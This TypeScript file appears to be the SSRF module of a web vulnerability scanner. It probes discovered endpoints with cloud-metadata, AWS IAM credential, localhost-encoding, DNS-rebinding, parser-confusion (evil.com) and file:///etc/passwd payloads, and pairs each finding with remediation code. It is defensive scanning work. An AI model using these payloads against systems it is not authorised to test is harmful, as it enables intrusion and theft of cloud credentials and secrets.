import type { ScanModule, Finding } from "../types";
import { scanFetch } from "../fetch";
import { looksLikeHtml } from "../soft404";

const SSRF_PARAMS = [
  "url", "uri", "link", "src", "source", "href", "path", "file",
  "page", "site", "feed", "host", "redirect", "proxy", "fetch",
  "load", "target", "image", "imageUrl", "image_url", "img",
  "picture", "pic", "icon", "avatar", "callback", "webhook",
];

const SSRF_PAYLOADS = [
  { payload: "http://169.254.169.254/latest/meta-data/", name: "AWS metadata" },
  { payload: "http://metadata.google.internal/computeMetadata/v1/", name: "GCP metadata" },
  { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", name: "Azure metadata" },
  { payload: "http://127.0.0.1:3000/", name: "localhost" },
  { payload: "http://[::1]:3000/", name: "IPv6 localhost" },
  { payload: "http://0.0.0.0/", name: "zero address" },
  { payload: "http://localhost/server-status", name: "Apache server-status" },
  // Filter bypass variants
  { payload: "http://2130706433/", name: "localhost" }, // 127.0.0.1 as decimal
  { payload: "http://0x7f000001/", name: "localhost" }, // 127.0.0.1 as hex
  { payload: "http://017700000001/", name: "localhost" }, // 127.0.0.1 as octal
  { payload: "http://127.1/", name: "localhost" }, // shortened localhost
  { payload: "http://169.254.169.254.nip.io/latest/meta-data/", name: "AWS metadata" }, // DNS rebinding via nip.io
  // Internal services commonly found in vibe-coded stacks
  { payload: "http://127.0.0.1:5555/", name: "localhost" }, // Prisma Studio default
  { payload: "http://127.0.0.1:8080/", name: "localhost" }, // Common proxy/admin
  { payload: "http://127.0.0.1:6379/INFO", name: "Redis" }, // Redis info
  // Protocol confusion
  { payload: "file:///etc/passwd", name: "file protocol" },
  { payload: "file:///proc/self/environ", name: "file protocol" },
];

export const ssrfModule: ScanModule = async (target) => {
  const findings: Finding[] = [];
  const allJs = Array.from(target.jsContents.values()).join("\n");

  // Find URL-fetching endpoints from JS bundles
  const fetchEndpoints = new Set<string>();

  // Look for endpoints that accept URL parameters
  const urlPatterns = [
    /["'`](\/api\/[a-zA-Z0-9/_-]*(?:proxy|fetch|scrape|preview|embed|og|meta|image|screenshot|pdf|render|import|webhook|callback)[a-zA-Z0-9/_-]*)["'`]/gi,
  ];
  for (const pat of urlPatterns) {
    for (const m of allJs.matchAll(pat)) {
      if (m[1]) fetchEndpoints.add(target.baseUrl + m[1]);
    }
  }

  // Also check discovered API endpoints
  for (const ep of target.apiEndpoints) {
    if (/proxy|fetch|scrape|preview|embed|og|meta|screenshot|pdf|render|import|url|image|webhook|callback/i.test(ep)) {
      fetchEndpoints.add(ep);
    }
  }

  if (fetchEndpoints.size === 0) return findings;

  const MAX_FINDINGS = 3;
  const testedEndpoints = [...fetchEndpoints].slice(0, 10);

  let ssrfCount = 0;

  // Test all endpoints in parallel — each runs GET + POST tests concurrently
  const endpointResults = await Promise.allSettled(
    testedEndpoints.map(async (endpoint) => {
      const pathname = new URL(endpoint).pathname;
      const hits: Finding[] = [];

      // GET and POST tests in parallel
      const getTests = SSRF_PARAMS.slice(0, 8).flatMap((param) =>
        SSRF_PAYLOADS.slice(0, 3).map(({ payload, name }) => ({ param, payload, name })),
      );

      const [getResults, postResults] = await Promise.all([
        Promise.allSettled(
          getTests.map(async ({ param, payload, name }) => {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, payload);
            const res = await scanFetch(testUrl.href, { timeoutMs: 5000 });
            const text = await res.text();
            if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, name)) {
              return { type: "get" as const, param, name, url: testUrl.href, status: res.status, text: text.substring(0, 200), pathname };
            }
            return null;
          }),
        ),
        Promise.allSettled(
          SSRF_PAYLOADS.slice(0, 3).map(async ({ payload, name }) => {
            const res = await scanFetch(endpoint, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ url: payload, uri: payload, source: payload }), timeoutMs: 5000,
            });
            const text = await res.text();
            if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, name)) {
              return { type: "post" as const, name, endpoint, payload, status: res.status, text: text.substring(0, 200), pathname };
            }
            return null;
          }),
        ),
      ]);

      for (const r of getResults) {
        if (r.status === "fulfilled" && r.value) return r.value;
      }
      for (const r of postResults) {
        if (r.status === "fulfilled" && r.value) return r.value;
      }
      return null;
    }),
  );

  for (const r of endpointResults) {
    if (findings.length >= MAX_FINDINGS) break;
    if (r.status !== "fulfilled" || !r.value) continue;
    const v = r.value;
    const isErrorLeak = /ECONNREFUSED|getaddrinfo|ETIMEDOUT|EHOSTUNREACH/i.test(v.text);
    const severity = isErrorLeak ? "high" : "critical";
    const desc = isErrorLeak
      ? "The endpoint processes user-supplied URLs server-side, leaking internal network errors. While data wasn't returned, this confirms the server makes internal requests from user input."
      : "The endpoint fetches user-supplied URLs server-side without validating the target, returning internal data.";
    if (v.type === "get") {
      findings.push({
        id: `ssrf-get-${ssrfCount++}`, module: "SSRF", severity,
        title: `SSRF: ${v.name} ${isErrorLeak ? "connection attempted" : "accessible"} via ${v.param} parameter on ${v.pathname}`,
        description: desc,
        evidence: `GET ${v.url}\nStatus: ${v.status}\nResponse preview: ${v.text}`,
        remediation: "Validate and sanitize URLs before fetching. Block requests to internal IP ranges. Use an allowlist of permitted domains.",
        cwe: "CWE-918", owasp: "A10:2021",
        codeSnippet: `// Validate URLs before server-side fetch\nconst url = new URL(input);\nconst BLOCKED = /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2|3[01])\\.|0\\.0\\.0\\.0|localhost|::1)/;\nif (BLOCKED.test(url.hostname)) throw new Error("Blocked");\nif (url.protocol !== "https:") throw new Error("HTTPS only");`,
      });
    } else {
      findings.push({
        id: `ssrf-post-${ssrfCount++}`, module: "SSRF", severity,
        title: `SSRF: ${v.name} ${isErrorLeak ? "connection attempted" : "accessible"} via POST body on ${v.pathname}`,
        description: desc,
        evidence: `POST ${v.endpoint} with url: ${v.payload}\nStatus: ${v.status}\nResponse preview: ${v.text}`,
        remediation: "Validate and sanitize URLs before fetching. Block internal IP ranges. Use domain allowlists.",
        cwe: "CWE-918", owasp: "A10:2021",
        codeSnippet: `// Validate URLs before server-side fetch\nconst url = new URL(input);\nconst BLOCKED = /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2|3[01])\\.|0\\.0\\.0\\.0|localhost|::1)/;\nif (BLOCKED.test(url.hostname)) throw new Error("Blocked");\nif (url.protocol !== "https:") throw new Error("HTTPS only");`,
      });
    }
  }

  // Phase 2: DNS rebinding detection — test URLs with short TTL domain patterns
  if (findings.length < MAX_FINDINGS && testedEndpoints.length > 0) {
    const rebindDomains = [
      { payload: "http://7f000001.nip.io/", name: "nip.io rebind to 127.0.0.1" },
      { payload: "http://127.0.0.1.nip.io/", name: "nip.io rebind to 127.0.0.1" },
      { payload: "http://a]@127.0.0.1/", name: "bracket-based URL confusion" },
      { payload: "http://spoofed.burpcollaborator.net/", name: "external rebind domain" },
    ];

    const rebindResults = await Promise.allSettled(
      testedEndpoints.slice(0, 5).flatMap((endpoint) =>
        SSRF_PARAMS.slice(0, 4).flatMap((param) =>
          rebindDomains.map(async ({ payload, name }) => {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, payload);
            try {
              const res = await scanFetch(testUrl.href, { timeoutMs: 8000 });
              const text = await res.text();
              if (res.ok && text.length > 10 && !looksLikeHtml(text)) {
                if (/ECONNREFUSED|127\.0\.0\.1|localhost|::1|internal|admin|dashboard/i.test(text)) {
                  return { param, endpoint, payload, name, text: text.substring(0, 200), pathname: new URL(endpoint).pathname };
                }
              }
            } catch { /* skip */ }
            return null;
          }),
        ),
      ),
    );

    for (const r of rebindResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (r.status !== "fulfilled" || !r.value) continue;
      const v = r.value;
      findings.push({
        id: `ssrf-dns-rebind-${ssrfCount++}`,
        module: "SSRF",
        severity: "high",
        title: `DNS rebinding SSRF via ${v.name} on ${v.pathname}`,
        description: "The server fetches user-supplied URLs that use DNS rebinding domains (e.g., nip.io). These domains initially resolve to a public IP but can be rebound to internal IPs with short TTL, bypassing IP allowlist checks that only validate at DNS resolution time.",
        evidence: `Param: ${v.param}\nPayload: ${v.payload}\nResponse preview: ${v.text}`,
        remediation: "Validate the resolved IP address after DNS resolution, not just the hostname. Re-validate on every connection attempt. Block private IP ranges at the network level. Consider pinning DNS results for the duration of the request.",
        cwe: "CWE-918",
        owasp: "A10:2021",
        confidence: 80,
        codeSnippet: `// Validate resolved IP, not just hostname\nimport dns from "dns/promises";\nasync function safeFetch(url: string) {\n  const { hostname } = new URL(url);\n  const { address } = await dns.lookup(hostname);\n  const PRIVATE = /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2|3[01])\\.|0\\.0\\.0\\.0|::1|fc00:|fe80:)/;\n  if (PRIVATE.test(address)) throw new Error("Blocked: resolves to private IP");\n  return fetch(url);\n}`,
      });
    }
  }

  // Phase 3: IPv6 bypass — test various IPv6 representations of localhost
  if (findings.length < MAX_FINDINGS && testedEndpoints.length > 0) {
    const ipv6Payloads = [
      { payload: "http://[::1]/", name: "IPv6 loopback [::1]" },
      { payload: "http://[::1]:3000/", name: "IPv6 loopback [::1]:3000" },
      { payload: "http://[0:0:0:0:0:0:0:1]/", name: "IPv6 full loopback" },
      { payload: "http://[::ffff:127.0.0.1]/", name: "IPv6-mapped IPv4 127.0.0.1" },
      { payload: "http://[::ffff:7f00:1]/", name: "IPv6-mapped IPv4 hex" },
      { payload: "http://[::ffff:169.254.169.254]/", name: "IPv6-mapped AWS metadata" },
      { payload: "http://[0000::1]/", name: "IPv6 padded loopback" },
      { payload: "http://[::1%25eth0]/", name: "IPv6 zone ID bypass" },
    ];

    const ipv6Results = await Promise.allSettled(
      testedEndpoints.slice(0, 5).flatMap((endpoint) =>
        SSRF_PARAMS.slice(0, 4).flatMap((param) =>
          ipv6Payloads.map(async ({ payload, name }) => {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, payload);
            try {
              const res = await scanFetch(testUrl.href, { timeoutMs: 5000 });
              const text = await res.text();
              if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, "localhost")) {
                return { param, endpoint, payload, name, text: text.substring(0, 200), pathname: new URL(endpoint).pathname, status: res.status };
              }
            } catch { /* skip */ }
            return null;
          }),
        ),
      ),
    );

    for (const r of ipv6Results) {
      if (findings.length >= MAX_FINDINGS) break;
      if (r.status !== "fulfilled" || !r.value) continue;
      const v = r.value;
      const isErrorLeak = /ECONNREFUSED|getaddrinfo|ETIMEDOUT|EHOSTUNREACH/i.test(v.text);
      findings.push({
        id: `ssrf-ipv6-${ssrfCount++}`,
        module: "SSRF",
        severity: isErrorLeak ? "high" : "critical",
        title: `SSRF via IPv6 bypass (${v.name}) on ${v.pathname}`,
        description: `The server fetches user-supplied URLs containing IPv6 addresses that resolve to internal services. The URL validation only blocks IPv4 private ranges but does not account for IPv6 equivalents like ::1, ::ffff:127.0.0.1, or zone ID tricks.`,
        evidence: `Param: ${v.param}\nPayload: ${v.payload}\nStatus: ${v.status}\nResponse preview: ${v.text}`,
        remediation: "Block both IPv4 and IPv6 private/loopback addresses. Validate the resolved IP address (not the URL string) against a blocklist that includes ::1, ::ffff:127.0.0.1, fe80::/10, fc00::/7, and other private IPv6 ranges.",
        cwe: "CWE-918",
        owasp: "A10:2021",
        confidence: 85,
        codeSnippet: `// Block IPv6 loopback and private ranges\nconst BLOCKED_IPV6 = /^(::1|::ffff:127\\.|::ffff:10\\.|::ffff:192\\.168\\.|::ffff:172\\.(1[6-9]|2|3[01])\\.|fe80:|fc00:|fd00:)/i;\nconst BLOCKED_IPV4 = /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2|3[01])\\.|0\\.0\\.0\\.0|169\\.254\\.)/;\nfunction isBlockedIP(ip: string): boolean {\n  return BLOCKED_IPV4.test(ip) || BLOCKED_IPV6.test(ip);\n}`,
      });
    }
  }

  // Phase 4: URL parser differential — exploit differences between URL parsers
  if (findings.length < MAX_FINDINGS && testedEndpoints.length > 0) {
    const parserPayloads = [
      { payload: "http://127.0.0.1#@evil.com", name: "fragment-based host confusion" },
      { payload: "http://evil.com@127.0.0.1/", name: "credential-section host swap" },
      { payload: "http://127.0.0.1:80@evil.com/", name: "port-credential confusion" },
      { payload: "http://evil.com%40127.0.0.1/", name: "encoded @ sign bypass" },
      { payload: "http://127.0.0.1%2f@evil.com/", name: "encoded slash in authority" },
      { payload: "http://127.0.0.1:80%23@evil.com/", name: "encoded fragment in authority" },
      { payload: "http://127.1.1.1\\@127.0.0.1/", name: "backslash authority confusion" },
      { payload: "http://127.0.0.1%00@evil.com/", name: "null byte truncation" },
    ];

    const parserResults = await Promise.allSettled(
      testedEndpoints.slice(0, 5).flatMap((endpoint) =>
        SSRF_PARAMS.slice(0, 4).flatMap((param) =>
          parserPayloads.map(async ({ payload, name }) => {
            const testUrl = new URL(endpoint);
            testUrl.searchParams.set(param, payload);
            try {
              const res = await scanFetch(testUrl.href, { timeoutMs: 5000 });
              const text = await res.text();
              if (res.ok && text.length > 10 && !looksLikeHtml(text) && isSSRFIndicator(text, "localhost")) {
                return { param, endpoint, payload, name, text: text.substring(0, 200), pathname: new URL(endpoint).pathname, status: res.status };
              }
            } catch { /* skip */ }
            return null;
          }),
        ),
      ),
    );

    for (const r of parserResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (r.status !== "fulfilled" || !r.value) continue;
      const v = r.value;
      const isErrorLeak = /ECONNREFUSED|getaddrinfo|ETIMEDOUT|EHOSTUNREACH/i.test(v.text);
      findings.push({
        id: `ssrf-parser-diff-${ssrfCount++}`,
        module: "SSRF",
        severity: isErrorLeak ? "high" : "critical",
        title: `SSRF via URL parser differential (${v.name}) on ${v.pathname}`,
        description: `The server's URL validation and its HTTP client parse the URL differently. The validation checks against one hostname (e.g., evil.com) while the HTTP client connects to another (127.0.0.1). This class of vulnerability exploits differences between URL parsers in the security check vs. the actual request.`,
        evidence: `Param: ${v.param}\nPayload: ${v.payload}\nStatus: ${v.status}\nResponse preview: ${v.text}`,
        remediation: "Use a single URL parser for both validation and fetching. Resolve the hostname to an IP address and validate the IP against a blocklist before making the request. Do not rely on hostname string matching alone.",
        cwe: "CWE-918",
        owasp: "A10:2021",
        confidence: 90,
        codeSnippet: `// Use consistent URL parsing + IP validation\nimport dns from "dns/promises";\nasync function safeFetch(input: string) {\n  // Parse once with the same parser the HTTP client uses\n  const url = new URL(input);\n  // Reject URLs with credentials section (user:pass@host)\n  if (url.username || url.password) throw new Error("Credentials in URL blocked");\n  // Resolve and validate the actual IP\n  const { address } = await dns.lookup(url.hostname);\n  const PRIVATE = /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2|3[01])\\.|0\\.0\\.0\\.0|::1|::ffff:127\\.)/;\n  if (PRIVATE.test(address)) throw new Error("Private IP blocked");\n  return fetch(url.href, { redirect: "error" });\n}`,
      });
    }
  }

  // Phase 5: Redirect-based SSRF — server may follow redirects to internal targets
  if (findings.length < MAX_FINDINGS && testedEndpoints.length > 0) {
    // Check if any endpoint follows redirects by testing with a URL that redirects
    const redirectResults = await Promise.allSettled(
      testedEndpoints.slice(0, 5).map(async (endpoint) => {
        const pathname = new URL(endpoint).pathname;
        // Use httpbin-style redirect to check if the server follows redirects
        for (const param of SSRF_PARAMS.slice(0, 4)) {
          // Test with a URL that would redirect to the cloud metadata endpoint
          const testUrl = new URL(endpoint);
          testUrl.searchParams.set(param, "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
          const res = await scanFetch(testUrl.href, { timeoutMs: 8000 });
          if (!res.ok) continue;
          const text = await res.text();
          // Check if response contains IAM credential fields
          if (/AccessKeyId|SecretAccessKey|Token|Expiration/i.test(text)) {
            return { param, pathname, text: text.substring(0, 300) };
          }
        }
        return null;
      }),
    );
    for (const r of redirectResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (r.status !== "fulfilled" || !r.value) continue;
      findings.push({
        id: `ssrf-iam-creds-${ssrfCount++}`, module: "SSRF", severity: "critical",
        title: `AWS IAM credentials accessible via SSRF on ${r.value.pathname}`,
        description: "The server-side fetch followed a redirect to the AWS metadata service and returned IAM security credentials. An attacker can use these credentials to access AWS services.",
        evidence: `Param: ${r.value.param}\nResponse contains IAM credentials: ${r.value.text}`,
        remediation: "Block requests to 169.254.169.254 and link-local addresses. Use IMDSv2 (requires PUT token request). Disable redirect following in server-side fetch.",
        cwe: "CWE-918", owasp: "A10:2021",
        codeSnippet: `// Disable redirect following in fetch\nconst res = await fetch(url, { redirect: "error" });\n\n// Block metadata IPs\nconst blocked = ["169.254.169.254", "fd00:ec2::254"];\nconst resolved = await dns.resolve(new URL(url).hostname);\nif (blocked.some(ip => resolved.includes(ip))) throw new Error("Blocked");`,
        confidence: 95,
      });
    }
  }

  // Phase 3: Check for blind SSRF via error timing difference
  if (findings.length === 0 && testedEndpoints.length > 0) {
    const timingResults = await Promise.allSettled(
      testedEndpoints.slice(0, 3).map(async (endpoint) => {
        const pathname = new URL(endpoint).pathname;
        for (const param of SSRF_PARAMS.slice(0, 3)) {
          // Baseline with valid external URL
          const baseStart = Date.now();
          const baseUrl = new URL(endpoint);
          baseUrl.searchParams.set(param, "https://example.com");
          try { await scanFetch(baseUrl.href, { timeoutMs: 8000 }); } catch { /* skip */ }
          const baseTime = Date.now() - baseStart;

          // Test with internal port that should timeout differently
          const testStart = Date.now();
          const testEndpoint = new URL(endpoint);
          testEndpoint.searchParams.set(param, "http://127.0.0.1:1");
          try { await scanFetch(testEndpoint.href, { timeoutMs: 8000 }); } catch { /* skip */ }
          const testTime = Date.now() - testStart;

          // If test took significantly longer (connection timeout vs immediate response), server is connecting
          if (testTime > baseTime + 2000 && testTime > 3000) {
            return { param, pathname, baseTime, testTime };
          }
        }
        return null;
      }),
    );
    for (const r of timingResults) {
      if (findings.length >= MAX_FINDINGS) break;
      if (r.status !== "fulfilled" || !r.value) continue;
      findings.push({
        id: `ssrf-blind-${ssrfCount++}`, module: "SSRF", severity: "medium",
        title: `Possible blind SSRF (timing-based) on ${r.value.pathname}`,
        description: `The server takes ${r.value.testTime}ms to respond when given an internal URL (vs ${r.value.baseTime}ms baseline). This timing difference suggests the server attempts to connect to user-supplied URLs.`,
        evidence: `Param: ${r.value.param}\nBaseline (example.com): ${r.value.baseTime}ms\nInternal (127.0.0.1:1): ${r.value.testTime}ms`,
        remediation: "Validate and restrict URL targets. Block internal IP ranges. Use a URL allowlist.",
        cwe: "CWE-918", owasp: "A10:2021",
        confidence: 60,
      });
    }
  }

  return findings;
};

const isSSRFIndicator = (text: string, payloadName: string): boolean => {
  if (payloadName === "AWS metadata") {
    return /ami-id|instance-id|instance-type|local-hostname|public-hostname|security-credentials/i.test(text);
  }
  if (payloadName === "GCP metadata") {
    return /project-id|zone|machine-type|service-accounts/i.test(text);
  }
  if (payloadName === "Azure metadata") {
    return /vmId|subscriptionId|resourceGroupName|vmSize/i.test(text);
  }
  if (payloadName === "Apache server-status") {
    return /Apache Server Status|scoreboard/i.test(text);
  }
  if (payloadName === "Redis") {
    return /redis_version|connected_clients|used_memory|tcp_port|uptime_in_seconds|role:master|role:slave/i.test(text);
  }
  if (payloadName === "file protocol") {
    return /root:.*:0:0|\/bin\/(bash|sh)|HOME=|PATH=|HOSTNAME=|SECRET|KEY|TOKEN|PASSWORD/i.test(text);
  }
  // For localhost/zero-address: check for internal service interaction evidence
  if (/localhost|zero address|IPv6/.test(payloadName)) {
    // "Connection refused" errors prove the server tried to connect internally — medium severity SSRF
    if (/ECONNREFUSED|connect ECONNREFUSED|connection refused/i.test(text)) return true;
    // Generic fetch errors that don't reveal connection behavior aren't useful
    if (text.includes("fetch failed") || text.length < 50) return false;
    // DNS resolution or timeout errors still prove the server processes user URLs
    if (/getaddrinfo|ETIMEDOUT|EHOSTUNREACH/i.test(text)) return true;
    // Generic "unable/failed" that doesn't leak connection details — skip
    if (/cannot|couldn't|unable|failed|error|timeout|unreachable/i.test(text.substring(0, 200)) &&
        !/ECONNREFUSED|127\.0\.0\.1|localhost|::1|0\.0\.0\.0/i.test(text)) return false;
    // Structural indicators of an actual internal service response
    const hasStructure = (text.includes("<title>") && text.includes("</title>")) ||
      (text.startsWith("{") && text.length > 100) ||
      /server-status|phpinfo|admin|dashboard/i.test(text);
    return hasStructure;
  }
  return false;
};
